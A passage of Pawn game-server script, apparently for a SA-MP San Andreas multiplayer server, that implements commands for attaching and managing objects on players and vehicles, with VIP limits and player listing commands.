			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /oreplace <1-4> <objectid> [Premium users: max. 8 objects]");
		}
		soid -= 1;
	} else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /oreplace <1-4> <objectid> [Premium users: max. 8 objects]");

	if (pSObject[playerid][soid][so_model] == -1)
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no object in this slot!");

	strings = strtok(params, idx);
	if (!strlen(strings) || !IsNumeric(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /oreplace <1-4> <objectid> [Premium users: max. 8 objects]");
	modelid2 = strval(strings);

	if (!IsValidModel(modelid2) || modelid2 == 362)
	return SendErrorMessage(playerid, EMBED_WHITE, "The model ID you supplied doesn't seem to be valid!");

	pSObject[playerid][soid][so_model] = modelid2;
	DestroyObject(pSObject[playerid][soid][so_object]);
	pSObject[playerid][soid][so_object] = CreateObject(modelid2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	new vID = GetPlayerVehicleID(playerid);
	if (!vID)
	{
		AttachObjectToPlayer(pSObject[playerid][soid][so_object], playerid, pSObject[playerid][soid][so_x], pSObject[playerid][soid][so_y], pSObject[playerid][soid][so_z], pSObject[playerid][soid][so_rx], pSObject[playerid][soid][so_ry], pSObject[playerid][soid][so_rz]);
		pSObject[playerid][soid][so_isvehicle] = 0;
		pSObject[playerid][soid][so_vehiclemodel] = 0;
	} else {
		AttachObjectToVehicle(pSObject[playerid][soid][so_object], vID, pSObject[playerid][soid][so_x], pSObject[playerid][soid][so_y], pSObject[playerid][soid][so_z], pSObject[playerid][soid][so_rx], pSObject[playerid][soid][so_ry], pSObject[playerid][soid][so_rz]);
		pSObject[playerid][soid][so_isvehicle] = vID;
		pSObject[playerid][soid][so_vehiclemodel] = GetVehicleModel(vID);
	}

	if (IsVIP(playerid)) format(strings, sizeof(strings), "Status: Replaced %d -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d", soid+1, pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model], pSObject[playerid][4][so_model], pSObject[playerid][5][so_model], pSObject[playerid][6][so_model], pSObject[playerid][7][so_model]);
	else format(strings, sizeof(strings), "Status: Replaced %d -> #1: %d #2: %d #3: %d #4: %d", soid+1, pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model]);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	return 1;
}

dcmd_ounstick(playerid,params[])
{
	new idx,
		ounid;

	strings = strtok(params, idx);
	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ounstick <1-4|all> [Premium users: max. 8 objects]");

	if (!IsNumeric(strings))
	{
		if (!strcmp(strings, "all", true))
		{
			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[playerid][i][so_model] != -1)
			    {
	    	        if (pSObject[playerid][i][so_object] != -1)
					DestroyObject(pSObject[playerid][i][so_object]);
					
					pSObject[playerid][i][so_object] 	= -1;
					pSObject[playerid][i][so_model] 	= -1;
					pSObject[playerid][i][so_x]         = 0.0;
					pSObject[playerid][i][so_y]         = 0.0;
					pSObject[playerid][i][so_z]         = 0.0;
					pSObject[playerid][i][so_rx]        = 0.0;
					pSObject[playerid][i][so_ry]        = 0.0;
					pSObject[playerid][i][so_rz]        = 0.0;
				}
			}
			player[playerid][ostickc] = 0;

			if (IsVIP(playerid)) format(strings, sizeof(strings), "Status: Removed all -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d", pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model], pSObject[playerid][4][so_model], pSObject[playerid][5][so_model], pSObject[playerid][6][so_model], pSObject[playerid][7][so_model]);
			else format(strings, sizeof(strings), "Status: Removed all -> #1: %d #2: %d #3: %d #4: %d", pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model]);
			SendClientMessage(playerid, COLOR_YELLOW, strings);
			return 1;
		} else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ounstick <1-4|all> [Premium users: max. 8 objects]");
	}

	ounid = strval(strings);
	if (ounid > 0)
	{
		if (IsVIP(playerid))
		{
			if (ounid > VIP_MAX_OSTICKS)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ounstick <1-4|all> [Premium users: max. 8 objects]");
		} else {
			if (ounid > DEFAULT_MAX_OSTICKS)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ounstick <1-4|all> [Premium users: max. 8 objects]");
		}
	    ounid -= 1;
	}

	if (pSObject[playerid][ounid][so_model] == -1)
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no object in this slot!");

	DestroyObject(pSObject[playerid][ounid][so_object]);
	player[playerid][ostickc]--;
	pSObject[playerid][ounid][so_object] 	= -1;
	pSObject[playerid][ounid][so_model] 	= -1;
	pSObject[playerid][ounid][so_x]         = 0.0;
	pSObject[playerid][ounid][so_y]         = 0.0;
	pSObject[playerid][ounid][so_z]         = 0.0;
	pSObject[playerid][ounid][so_rx]        = 0.0;
	pSObject[playerid][ounid][so_ry]        = 0.0;
	pSObject[playerid][ounid][so_rz]        = 0.0;

	if (IsVIP(playerid)) format(strings, sizeof(strings), "Status: Removed %d -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d", ounid+1, pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model], pSObject[playerid][4][so_model], pSObject[playerid][5][so_model], pSObject[playerid][6][so_model], pSObject[playerid][7][so_model]);
	else format(strings, sizeof(strings), "Status: Removed %d -> #1: %d #2: %d #3: %d #4: %d", ounid+1, pSObject[playerid][0][so_model], pSObject[playerid][1][so_model], pSObject[playerid][2][so_model], pSObject[playerid][3][so_model]);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	return 1;
}

dcmd_osticks(playerid,params[])
{
	#pragma unused params

	ShowPlayerStickyObjectsList(playerid);
	return 1;
}

dcmd_osticksoff(playerid,params[])
{
	#pragma unused params

	for (new pi = 0; pi < VIP_MAX_OSTICKS; pi++)
	{
	    if (pSObject[playerid][pi][so_object] != -1)
	    {
		    DestroyObject(pSObject[playerid][pi][so_object]);
		    pSObject[playerid][pi][so_object] = -1;
	    }
	}
	SendClientMessage(playerid, COLOR_LIME, "[INFO] Your sticked objects are now invisible.");
	return 1;
}

dcmd_ostickson(playerid,params[])
{
	#pragma unused params

	ReloadStickedObjects(playerid);
	SendClientMessage(playerid, COLOR_LIME, "[INFO] Your sticked objects are restored.");
	return 1;
}

dcmd_postick(playerid,params[])
{
	new idx,
	    boneid,
		modelid2,
		Float:X,
	 	Float:Y,
	 	Float:Z,
	 	Float:rX,
	 	Float:rY,
	 	Float:rZ,
	 	Float:sX = 1.0,
		Float:sY = 1.0,
		Float:sZ = 1.0,
	 	freeid;

	strings = strtok(params, idx);
	if (!strlen(strings))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /postick <objectid> <boneid> (OFFSET_x y z) (ROTATION_rx ry rz) (SCALE_sx sy sz) [Premium users: max. 10 objects, scale factor 100.0]");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}
	modelid2 = strval(strings);

	strings = strtok(params, idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 18 || !IsNumeric(strings))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /postick <objectid> <boneid> (OFFSET_x y z) (ROTATION_rx ry rz) (SCALE_sx sy sz) [Premium users: max. 10 objects, scale factor 100.0]");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}
	boneid = strval(strings);

	if (!IsValidModel(modelid2) || modelid2 == 362)
	return SendErrorMessage(playerid, EMBED_WHITE, "The model ID you supplied doesn't seem to be valid!");

	if (IsVIP(playerid))
	{
		if (player[playerid][postickc] >= VIP_MAX_POSTICKS)
		return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the postick limit (max. 5), type /pounstick <1-5> to remove. [Premium users: max. 10 objects, scale factor 100.0]");
	} else {
		if (player[playerid][postickc] >= DEFAULT_MAX_POSTICKS)
		return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the postick limit (max. 5), type /pounstick <1-5> to remove. [Premium users: max. 10 objects, scale factor 100.0]");
	}
	player[playerid][postickc]++;

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	X = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	Y = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	Z = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rX = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rY = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rZ = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	{
		sX = floatstr(strings);

		strings = strtok(params, idx);
		if (strlen(strings) || IsNumeric(strings))
		sY = floatstr(strings);

		strings = strtok(params, idx);
		if (strlen(strings) || IsNumeric(strings))
		sZ = floatstr(strings);

		if (IsVIP(playerid))
		{
			if (sX < 0 || sX > VIP_MAX_SCALE || sY < 0 || sY > VIP_MAX_SCALE || sZ < 0 || sZ > VIP_MAX_SCALE)
			return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the scaling limit (min. 0.0 - max. 3.0). [Premium users: max. 10 objects, scale factor 100.0]");
		} else {
			if (sX < 0 || sX > DEFAULT_MAX_SCALE || sY < 0 || sY > DEFAULT_MAX_SCALE || sZ < 0 || sZ > DEFAULT_MAX_SCALE)
			return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the scaling limit (min. 0.0 - max. 3.0). [Premium users: max. 10 objects, scale factor 100.0]");
		}
	}

	for (new e = 0; e < VIP_MAX_POSTICKS; e++)
	{
		if (!IsPlayerAttachedObjectSlotUsed(playerid, e))
		{
			pAObject[playerid][e][ao_model]	= modelid2;
			pAObject[playerid][e][ao_bone]	= boneid;
			pAObject[playerid][e][ao_x]		= X;
			pAObject[playerid][e][ao_y]		= Y;
			pAObject[playerid][e][ao_z]		= Z;
			pAObject[playerid][e][ao_rx]	= rX;
			pAObject[playerid][e][ao_ry]	= rY;
			pAObject[playerid][e][ao_rz]	= rZ;
			pAObject[playerid][e][ao_sx]	= sX;
			pAObject[playerid][e][ao_sy]	= sY;
			pAObject[playerid][e][ao_sz]	= sZ;
			freeid = e;
			break;
		}
 	}
	SetPlayerAttachedObject(playerid, freeid, modelid2, boneid, X, Y, Z, rX, rY, rZ, sX, sY, sZ);
	
	if (IsVIP(playerid)) format(strings, sizeof(strings), "pStatus: Added %d -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d #9: %d #10: %d", modelid2, pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model], pAObject[playerid][5][ao_model], pAObject[playerid][6][ao_model], pAObject[playerid][7][ao_model], pAObject[playerid][8][ao_model], pAObject[playerid][9][ao_model]);
	else format(strings, sizeof(strings), "pStatus: Added %d -> #1: %d #2: %d #3: %d #4: %d #5: %d", modelid2, pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model]);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	return 1;
}

dcmd_posetstick(playerid,params[])
{
    new idx,
		soid,
		boneid,
		Float:X,
	 	Float:Y,
	 	Float:Z,
	 	Float:rX,
	 	Float:rY,
	 	Float:rZ,
		Float:sX = 1.0,
		Float:sY = 1.0,
		Float:sZ = 1.0;

	strings = strtok(params, idx);
	soid = strval(strings);
	if (strlen(strings) && IsNumeric(strings) && soid > 0)
	{
		if (IsVIP(playerid))
		{
			if (soid > VIP_MAX_POSTICKS)
			{
				SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /posetstick <1-5> <boneid> <OFFSET_x y z> (ROTATION_x y z) (SCALE_x y z) [Premium users: max. 10 objects, scale factor 100.0]");
				SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
				SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
				return 1;
			}
		} else {
			if (soid > DEFAULT_MAX_POSTICKS)
			{
				SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /posetstick <1-5> <boneid> <OFFSET_x y z> (ROTATION_x y z) (SCALE_x y z) [Premium users: max. 10 objects, scale factor 100.0]");
				SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
				SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
				return 1;
			}
		}
		soid -= 1;
	} else {
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /posetstick <1-5> <boneid> <OFFSET_x y z> (ROTATION_x y z) (SCALE_x y z) [Premium users: max. 10 objects, scale factor 100.0]");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}

	if (!IsPlayerAttachedObjectSlotUsed(playerid, soid))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no object in this slot!");

	strings = strtok(params, idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 18 || !IsNumeric(strings))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /posetstick <1-5> <boneid> <OFFSET_x y z> (ROTATION_x y z) (SCALE_x y z) [Premium users: max. 10 objects, scale factor 100.0]");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}
	boneid = strval(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	X = floatstr(strings);
	else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /posetstick <1-5> <boneid> <OFFSET_x y z> (ROTATION_x y z) (SCALE_x y z) [Premium users: max. 10 objects, scale factor 100.0]");

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	Y = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	Z = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	rX = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	rY = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) && IsNumeric(strings))
	rZ = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	{
		sX = floatstr(strings);

		strings = strtok(params, idx);
		if (strlen(strings) || IsNumeric(strings))
		sY = floatstr(strings);

		strings = strtok(params, idx);
		if (strlen(strings) || IsNumeric(strings))
		sZ = floatstr(strings);

		if (IsVIP(playerid))
		{
			if (sX < 0 || sX > VIP_MAX_SCALE || sY < 0 || sY > VIP_MAX_SCALE || sZ < 0 || sZ > VIP_MAX_SCALE)
			return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the scaling limit (min. 0.0 - max. 3.0). [Premium users: max. 10 objects, scale factor 100.0]");
		} else {
			if (sX < 0 || sX > DEFAULT_MAX_SCALE || sY < 0 || sY > DEFAULT_MAX_SCALE || sZ < 0 || sZ > DEFAULT_MAX_SCALE)
			return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the scaling limit (min. 0.0 - max. 3.0). [Premium users: max. 10 objects, scale factor 100.0]");
		}
	}

	SetPlayerAttachedObject(playerid, soid, pAObject[playerid][soid][ao_model], boneid, X, Y, Z, rX, rY, rZ, sX, sY, sZ);

	pAObject[playerid][soid][ao_x]	= X;
	pAObject[playerid][soid][ao_y]	= Y;
	pAObject[playerid][soid][ao_z]	= Z;
	pAObject[playerid][soid][ao_rx]	= rX;
	pAObject[playerid][soid][ao_ry]	= rY;
	pAObject[playerid][soid][ao_rz]	= rZ;
	pAObject[playerid][soid][ao_sx]	= sX;
	pAObject[playerid][soid][ao_sy] = sY;
	pAObject[playerid][soid][ao_sz]	= sZ;
	
	if (IsVIP(playerid)) format(strings, sizeof(strings), "Set: Replaced %d -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d #9: %d #10: %d", soid+1, pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model], pAObject[playerid][5][ao_model], pAObject[playerid][6][ao_model], pAObject[playerid][7][ao_model], pAObject[playerid][8][ao_model], pAObject[playerid][9][ao_model]);
	else format(strings, sizeof(strings), "pStatus: Set %d -> #1: %d #2: %d #3: %d #4: %d #5: %d", soid+1, pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model]);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	return 1;
}

dcmd_poreplace(playerid,params[])
{
    new idx,
		soid,
		modelid2;

	strings = strtok(params, idx);
	soid = strval(strings);
	if (strlen(strings) && IsNumeric(strings) && soid > 0)
	{
		if (IsVIP(playerid))
		{
			if (soid > VIP_MAX_POSTICKS)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /poreplace <1-5> <objectid> [Premium users: max. 10 objects, scale factor 100.0]");
		} else {
			if (soid > DEFAULT_MAX_POSTICKS)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /poreplace <1-5> <objectid> [Premium users: max. 10 objects, scale factor 100.0]");
		}
		soid -= 1;
	} else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /poreplace <1-5> <objectid> [Premium users: max. 10 objects, scale factor 100.0]");

	if (!IsPlayerAttachedObjectSlotUsed(playerid, soid))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no object in this slot!");

	strings = strtok(params, idx);
	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /poreplace <1-5> <objectid> [Premium users: max. 10 objects, scale factor 100.0]");
	modelid2 = strval(strings);

	if (!IsValidModel(modelid2) || modelid2 == 362)
	return SendErrorMessage(playerid, EMBED_WHITE, "The model ID you supplied doesn't seem to be valid!");

	pAObject[playerid][soid][ao_model] = modelid2;
	SetPlayerAttachedObject(playerid, soid, modelid2, pAObject[playerid][soid][ao_bone], pAObject[playerid][soid][ao_x], pAObject[playerid][soid][ao_y], pAObject[playerid][soid][ao_z], pAObject[playerid][soid][ao_rx], pAObject[playerid][soid][ao_ry], pAObject[playerid][soid][ao_rz], pAObject[playerid][soid][ao_sx], pAObject[playerid][soid][ao_sy], pAObject[playerid][soid][ao_sz]);

	if (IsVIP(playerid)) format(strings, sizeof(strings), "pStatus: Replaced %d -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d #9: %d #10: %d", soid+1, pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model], pAObject[playerid][5][ao_model], pAObject[playerid][6][ao_model], pAObject[playerid][7][ao_model], pAObject[playerid][8][ao_model], pAObject[playerid][9][ao_model]);
	else format(strings, sizeof(strings), "pStatus: Replaced %d -> #1: %d #2: %d #3: %d #4: %d #5: %d", soid+1, pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model]);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	return 1;
}

dcmd_pounstick(playerid,params[])
{
	new idx,
		ounid;

	strings = strtok(params, idx);
	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /pounstick <1-5|all> [Premium users: max. 10 objects, scale factor 100.0]");

	if (!IsNumeric(strings))
	{
		if (!strcmp(strings, "all", true))
		{
			for (new i = 0; i < VIP_MAX_POSTICKS; i++)
			{
			    if (IsPlayerAttachedObjectSlotUsed(playerid, i))
			    {
				    RemovePlayerAttachedObject(playerid, i);
					pAObject[playerid][i][ao_model]	= -1;
					pAObject[playerid][i][ao_bone]	= 0;
					pAObject[playerid][i][ao_x]		= 0.0;
					pAObject[playerid][i][ao_y]		= 0.0;
					pAObject[playerid][i][ao_z]		= 0.0;
					pAObject[playerid][i][ao_rx]	= 0.0;
					pAObject[playerid][i][ao_ry]	= 0.0;
					pAObject[playerid][i][ao_rz]	= 0.0;
					pAObject[playerid][i][ao_sx]	= 1.0;
					pAObject[playerid][i][ao_sy]	= 1.0;
					pAObject[playerid][i][ao_sz]	= 1.0;
				}
			}
			player[playerid][postickc] = 0;

			if (IsVIP(playerid)) format(strings, sizeof(strings), "pStatus: Removed all -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d #9: %d #10: %d", pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model], pAObject[playerid][5][ao_model], pAObject[playerid][6][ao_model], pAObject[playerid][7][ao_model], pAObject[playerid][8][ao_model], pAObject[playerid][9][ao_model]);
			else format(strings, sizeof(strings), "pStatus: Removed all -> #1: %d #2: %d #3: %d #4: %d #5: %d", pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model]);
			SendClientMessage(playerid, COLOR_YELLOW, strings);
			return 1;
		} else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /pounstick <1-5|all> [Premium users: max. 10 objects, scale factor 100.0]");
	}

	ounid = strval(strings);
	if (ounid > 0)
	{
	    if (IsVIP(playerid))
	    {
			if (ounid > VIP_MAX_POSTICKS)
	    	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /pounstick <1-5|all> [Premium users: max. 10 objects, scale factor 100.0]");
	    } else {
			if (ounid > DEFAULT_MAX_POSTICKS)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /pounstick <1-5|all> [Premium users: max. 10 objects, scale factor 100.0]");
	    }
	    ounid -= 1;
	}

	if (!IsPlayerAttachedObjectSlotUsed(playerid, ounid))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no object in this slot!");

	RemovePlayerAttachedObject(playerid, ounid);
	player[playerid][postickc]--;
	pAObject[playerid][ounid][ao_model]	= -1;
	pAObject[playerid][ounid][ao_bone]	= 0;
	pAObject[playerid][ounid][ao_x]		= 0.0;
	pAObject[playerid][ounid][ao_y]		= 0.0;
	pAObject[playerid][ounid][ao_z]		= 0.0;
	pAObject[playerid][ounid][ao_rx]	= 0.0;
	pAObject[playerid][ounid][ao_ry]	= 0.0;
	pAObject[playerid][ounid][ao_rz]	= 0.0;
	pAObject[playerid][ounid][ao_sx]	= 1.0;
	pAObject[playerid][ounid][ao_sy]	= 1.0;
	pAObject[playerid][ounid][ao_sz]	= 1.0;

	if (IsVIP(playerid)) format(strings, sizeof(strings), "pStatus: Removed %d -> #1: %d #2: %d #3: %d #4: %d #5: %d #6: %d #7: %d #8: %d #9: %d #10: %d", ounid+1, pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model], pAObject[playerid][5][ao_model], pAObject[playerid][6][ao_model], pAObject[playerid][7][ao_model], pAObject[playerid][8][ao_model], pAObject[playerid][9][ao_model]);
	else format(strings, sizeof(strings), "pStatus: Removed %d -> #1: %d #2: %d #3: %d #4: %d #5: %d", ounid+1, pAObject[playerid][0][ao_model], pAObject[playerid][1][ao_model], pAObject[playerid][2][ao_model], pAObject[playerid][3][ao_model], pAObject[playerid][4][ao_model]);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	return 1;
}

dcmd_posticks(playerid,params[])
{
	#pragma unused params

	ShowPlayerAttachedObjectsList(playerid);
	return 1;
}

dcmd_posticksoff(playerid,params[])
{
	#pragma unused params

	for (new poi = 0; poi < VIP_MAX_POSTICKS; poi++)
	{
		if (IsPlayerAttachedObjectSlotUsed(playerid, poi))
		RemovePlayerAttachedObject(playerid, poi);
	}
	SendClientMessage(playerid, COLOR_LIME, "[INFO] Your attached objects are now invisible.");
	return 1;
}

dcmd_postickson(playerid,params[])
{
	#pragma unused params

	for (new poi = 0; poi < VIP_MAX_POSTICKS; poi++)
	{
	    if (pAObject[playerid][poi][ao_model] == -1)
	    continue;

	    SetPlayerAttachedObject(playerid, poi, pAObject[playerid][poi][ao_model], pAObject[playerid][poi][ao_bone], pAObject[playerid][poi][ao_x], pAObject[playerid][poi][ao_y], pAObject[playerid][poi][ao_z], pAObject[playerid][poi][ao_rx], pAObject[playerid][poi][ao_ry], pAObject[playerid][poi][ao_rz], pAObject[playerid][poi][ao_sx], pAObject[playerid][poi][ao_sy], pAObject[playerid][poi][ao_sz]);
	}
	SendClientMessage(playerid, COLOR_LIME, "[INFO] Your attached objects are restored.");
	return 1;
}

dcmd_listeners(playerid,params[])
{
	#pragma unused params

	new string[128],
		Players = 0;

	for (new i = 0; i < MAX_PLAYERS; i++)
	if (IsPlayerConnected(i) && player[i][radio] == 1) Players++;

	if (!Players)
	return SendClientMessage(playerid, COLOR_FLBLUE, "Listeners [0]: None");

	format(string, sizeof(string), "Listeners [%d]:", Players);
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i) && player[i][radio] == 1)
		{
		    GetPlayerName(i, playername, sizeof(playername));
			if (strlen(string) <= 100)
			{
				format(string, sizeof(string), "%s %s", string, playername);
			} else {
				SendClientMessage(playerid, COLOR_FLBLUE, string);
				format(string, sizeof(string), "%s", playername);
			}
        }
	}
	if (strlen(string) <= 100)
	SendClientMessage(playerid, COLOR_FLBLUE, string);
	return 1;
}

dcmd_listeners2(playerid,params[])
{
	#pragma unused params

	new string[128],
		Players = 0;

	for (new i = 0; i < MAX_PLAYERS; i++)
	if (IsPlayerConnected(i) && Audio_IsClientConnected(i)) Players++;

	if (!Players)
	return SendClientMessage(playerid, COLOR_FLBLUE, "Listeners [0]: None");

	format(string, sizeof(string), "Listeners [%d]:", Players);
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i) && Audio_IsClientConnected(i))
		{
		    GetPlayerName(i, playername, sizeof(playername));
			if (strlen(string) <= 100)
			{
				format(string, sizeof(string), "%s %s", string, playername);
			} else {
				SendClientMessage(playerid, COLOR_FLBLUE, string);
				format(string, sizeof(string), "%s", playername);
			}
        }
	}
	if (strlen(string) <= 100)
	SendClientMessage(playerid, COLOR_FLBLUE, string);
	return 1;
}

dcmd_vips(playerid,params[])
{
	#pragma unused params

	new string[128],
		Players = 0;

	for (new i = 0; i < MAX_PLAYERS; i++)
	if (IsPlayerConnected(i) && player[i][VIP] == 1 && player[i][ADMIN] == 0) Players++;

	if (!Players)
	return SendClientMessage(playerid, COLOR_FLBLUE, "VIPs [0]: None");

	format(string, sizeof(string), "VIPs [%d]:", Players);
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i) && player[i][VIP] == 1 && player[i][ADMIN] == 0)
		{
		    GetPlayerName(i, playername, sizeof(playername));
			if (strlen(string) <= 105)
			{
				format(string, sizeof(string), "%s %s", string, playername);
			} else {
				SendClientMessage(playerid, COLOR_FLBLUE, string);
